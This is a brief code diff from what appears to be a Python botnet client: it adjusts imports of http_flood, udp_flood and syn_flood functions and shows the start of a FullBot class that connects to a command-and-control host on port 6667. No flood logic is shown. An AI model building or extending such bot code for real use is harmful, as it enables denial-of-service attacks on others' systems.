@@ -14,8 +14,8 @@ import os
 
 # Add parent dir to path to import from src
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
-from attacks import http_flood, udp_flood, syn_flood
-from utils import add_system_log
+from src.attacks import http_flood, udp_flood, syn_flood
+from src.utils import add_system_log
 
 class FullBot:
     def __init__(self, c2_host='127.0.0.1', c2_port=6667):
